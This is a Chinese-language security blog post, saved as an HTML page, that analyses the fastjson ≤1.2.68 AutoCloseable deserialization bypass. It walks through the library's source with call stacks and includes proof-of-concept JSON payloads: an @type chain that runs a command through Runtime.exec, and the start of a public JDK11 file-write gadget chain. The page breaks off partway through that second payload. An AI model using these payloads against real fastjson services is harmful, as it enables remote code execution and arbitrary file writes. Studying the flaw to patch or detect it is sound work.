@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="fastjson ≤ 1.2.68  的利用链分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson ≤ 1.2.68 AutoCloseable 利用链分析">
+<meta property="og:url" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="M13n&#39;s Blog">
+<meta property="og:description" content="fastjson ≤ 1.2.68  的利用链分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401174314353.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401174146102.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210330101211247.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210330104752984.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210330171316878.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401171039720.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401171155430.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401182027693.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401182250554.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401183712320.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401184521386.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401184818203.png">
+<meta property="article:published_time" content="2021-03-29T06:37:27.000Z">
+<meta property="article:modified_time" content="2021-04-01T10:59:03.152Z">
+<meta property="article:author" content="M13n">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401174314353.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>fastjson ≤ 1.2.68 AutoCloseable 利用链分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/03/25/%E6%B5%85%E6%9E%90-fastjson-1-2-24-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%94%BB%E9%98%B2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson ≤ 1.2.68 AutoCloseable 利用链分析&body=Check out this article: http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson ≤ 1.2.68 AutoCloseable 利用链分析&description=&lt;p&gt;fastjson ≤ 1.2.68  的利用链分析&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-68-fastjson-safemode"><span class="toc-number">1.</span> <span class="toc-text">1.2.68 fastjson_safemode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-68-1-2-69-diff"><span class="toc-number">2.</span> <span class="toc-text">1.2.68-1.2.69 diff</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AutoCloseable-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">AutoCloseable 为什么能用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AutoCloseable-%E4%B8%8E-expectClass-%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">3.2.</span> <span class="toc-text">AutoCloseable 与 expectClass 的关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checkAutoType-%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">3.3.</span> <span class="toc-text">checkAutoType 的限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E9%93%BE"><span class="toc-number">3.4.</span> <span class="toc-text">如何构造链</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REF"><span class="toc-number">4.</span> <span class="toc-text">REF</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        fastjson ≤ 1.2.68 AutoCloseable 利用链分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">M13n's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-03-29T06:37:27.000Z" itemprop="datePublished">2021-03-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Java-Sec/">Java Sec</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Java/" rel="tag">Java</a>, <a class="tag-link-link" href="/tags/fastjson/" rel="tag">fastjson</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>fastjson ≤ 1.2.68  的利用链分析</p>
+<span id="more"></span>
+
+
+
+
+
+<h1 id="1-2-68-fastjson-safemode"><a href="#1-2-68-fastjson-safemode" class="headerlink" title="1.2.68 fastjson_safemode"></a>1.2.68 fastjson_safemode</h1><p>详情看官方 WiKi：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a></p>
+<p>开启 safeMode 后，如果解析到 <code>JSON.DEFAULT_TYPE_KEY</code> ，也就是解析到 <code>@type</code> ，还是会调用 <code>checkAutoType</code> 检查</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401174314353.png"></p>
+<p><code>checkAutoType</code> 内部增加了一个对 <code>safeMode</code> 值的判断，开启  <code>safeMode</code>  后直接抛出异常</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401174146102.png"></p>
+<h1 id="1-2-68-1-2-69-diff"><a href="#1-2-68-1-2-69-diff" class="headerlink" title="1.2.68-1.2.69 diff"></a>1.2.68-1.2.69 diff</h1><p>对比 1.2.68-1.2.69 版本，核心改动在期望类</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210330101211247.png"></p>
+<p>1.2.69 新增了以下3个类型的判断</p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>十进制hash值</th>
+<th>十六进制hash值</th>
+<th>类名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.69</td>
+<td>5183404141909004468L</td>
+<td>0x47ef269aadc650b4L</td>
+<td>java.lang.Runnable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>2980334044947851925L</td>
+<td>0x295c4605fd1eaa95L</td>
+<td>java.lang.Readable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-1368967840069965882L</td>
+<td>0xed007300a7b227c6L</td>
+<td>java.lang.AutoCloseable</td>
+</tr>
+</tbody></table>
+<p>触发漏洞的核心是 <code>java.lang.AutoCloseable</code></p>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>本流程分析致力于解决以下问题：</p>
+<ul>
+<li>AutoCloseable 为什么能用</li>
+<li>AutoCloseable 与 expectClass 的关系</li>
+<li>checkAutoType 的限制</li>
+<li>如何构造链</li>
+</ul>
+<h2 id="AutoCloseable-为什么能用"><a href="#AutoCloseable-为什么能用" class="headerlink" title="AutoCloseable 为什么能用"></a>AutoCloseable 为什么能用</h2><p>回顾 fastjson 的补丁，在开启 autoType 后 xx 类如果想通过 checkAutoType 的校验，往往是以下几种情况</p>
+<ul>
+<li>不在黑名单（补丁升级之前）</li>
+<li>在白名单中（可手动添加）</li>
+<li>在 mappings 中（1.2.47 bypass）</li>
+<li>其他</li>
+</ul>
+<p>1.2.68 mappings 初始化的时候， 会将 <code>java.lang.AutoCloseable</code> put 进入 ConcurrentMap</p>
+<p><code>com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</code></p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210330104752984.png"></p>
+<p>调用栈</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">addBaseClassMappings:<span class="number">1610</span>, TypeUtils (com.alibaba.fastjson.util)</span><br><span class="line">&lt;clinit&gt;:<span class="number">124</span>, TypeUtils (com.alibaba.fastjson.util)</span><br><span class="line">&lt;init&gt;:<span class="number">198</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">&lt;init&gt;:<span class="number">330</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">&lt;init&gt;:<span class="number">326</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">&lt;clinit&gt;:<span class="number">168</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">300</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:<span class="number">573</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">9</span>, AutoCloseableDemo (com.p2hm1n.fastjsondemo.basic)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="AutoCloseable-与-expectClass-的关系"><a href="#AutoCloseable-与-expectClass-的关系" class="headerlink" title="AutoCloseable 与 expectClass 的关系"></a>AutoCloseable 与 expectClass 的关系</h2><p>由于 ThrowableDeserializer 太局限，下文我们探讨主要范围是：JavaBeanDeserializer</p>
+<p>在梳理 AutoCloseable 与 expectClass 的关系之前，先看一下 AutoCloseable 是什么</p>
+<p>Java Doc 这样定义</p>
+<blockquote>
+<p>代表一个对象在close之前可能持有某些资源(文件或socket)。如果对象是在try-with-resources代码块中声明的， AutoCloseable对象的close()方法会被自动执行。这种构造方式保证了最快的资源释放，避免资源耗尽异常。</p>
+</blockquote>
+<p>Demo：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904007564001288">https://juejin.cn/post/6844904007564001288</a></p>
+<p>接着看 expectClass 是什么</p>
+<p>Demo</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AutoCloseableDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String jsonDemo = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.p2hm1n.fastjsondemo.basic.User\&quot;, \&quot;age\&quot;:10,\&quot;flag\&quot;:true,\&quot;name\&quot;:\&quot;zhangsan\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(jsonDemo);</span><br><span class="line">        JSON.parseObject(jsonDemo, User1.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述demo下，expectClass 通常为 parseObject 第二个参数</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210330171316878.png"></p>
+<p>用 1.2.47 的 bypass 思路，创建如下格式的 JSON</p>
+<p>JSON</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;fastjson.evilCode&quot;</span>, <span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;touch /Users/p2hm1n/Desktop/test/success&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Demo01.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        String poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;fastjson.evilCode\&quot;, \&quot;cmd\&quot;:\&quot;touch /Users/p2hm1n/Desktop/test/success\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        JSON.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>evilCode.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilCode</span> <span class="keyword">implements</span> <span class="title">AutoCloseable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401171039720.png"></p>
+<p>此时经过了一次 parseObject 中的 checkAutoType 后，在 JavabeanInfo 也会调用一次 checkAutoType，此时的期望类为之前的 AutoCloseable</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401171155430.png"></p>
+<p>调用栈</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">checkAutoType:<span class="number">1226</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:<span class="number">804</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">288</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">284</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">395</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1401</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1367</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">183</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">193</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">149</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:<span class="number">254</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">11</span>, Demo01 (fastjson)</span><br></pre></td></tr></table></figure>
+
+<p>那 expectClass 究竟在流程中起到了什么至关重要的作用？其涉及到了fastjson 的特性</p>
+<p>首先回顾之前的链路中，核心 RCE 的方式都是通过 jdbc 那个链来构造 jndi 注入</p>
+<p>后续的问题核心还是如何绕过黑名单机制的问题，后续跟进一下调用，在 <code>checkAutoType</code> 时，先检查 safeMode 模式是否开启，然后就是 1.2.24 后续补丁对<code>L</code>、<code>;</code>、<code>[</code> 等字符的检查，然后有相应的 expectClass 的判断，expectClassFlag 的附值，之后就是常规的黑白名单的校验</p>
+<p>后续获取 clazz</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401182027693.png"></p>
+<p>之后会进行一个黑名单的判断，如果为 ClassLoader.class、DataSource.class.、RowSet.class 的子类，则抛出异常，如果 expectClass 不为空，且 clazz 为 expectClass 的子类，最终返回 clazz</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401182250554.png"></p>
+<p>也就是这里的核心其实是靠 expectClass 的子类来实现 gadget 的调用</p>
+<p>攻击限制是：需要其 expectClass 的子类实现 setter 方法，后续在调用的时候会调用到</p>
+<h2 id="checkAutoType-的限制"><a href="#checkAutoType-的限制" class="headerlink" title="checkAutoType 的限制"></a>checkAutoType 的限制</h2><p>其实是不需要开启 AutoTypeSupport 的</p>
+<p>之前分析过由于 AutoCloseable 在 mappings 里面，因此 checkAutoType 的时候直接就返回 clazz 了</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401183712320.png"></p>
+<p>而如果不在 mappings 里面，会经过上述判断后，再进行常规黑白名单判断，最后再经过一堆判断后最终抛出异常</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401184521386.png"></p>
+<p>那么 safeMode 能不能限制呢？</p>
+<p>如下图可以发现，safeMode 的判断在 checkAutoType 方法中非常前面的位置。因此会直接抛出异常</p>
+<p><img src="/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210401184818203.png"></p>
+<h2 id="如何构造链"><a href="#如何构造链" class="headerlink" title="如何构造链"></a>如何构造链</h2><p>目前没有挖到新的链</p>
+<p>公开的应该是浅蓝师傅和 rmb122 师傅的，就不一一展开分析了</p>
+<p>JDK11，不依赖三方库</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;@type&#x27;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;@type&#x27;</span>:<span class="string">&#x27;sun.rmi.server.MarshalOutputStream&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;out&#x27;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;@type&#x27;</span>:<span class="string">&#x27;java.util.zip.InflaterOutputStream&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;out&#x27;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="string">&#x27;@type&#x27;</span>:<span class="string">&#x27;java.io.FileOutputStream&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;dst&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;append&#x27;</span>:<span class="keyword">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;infl&#x27;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;input&#x27;</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&#x27;array&#x27;</span>:<span class="string">&#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;</span>,</span><br><span class="line">                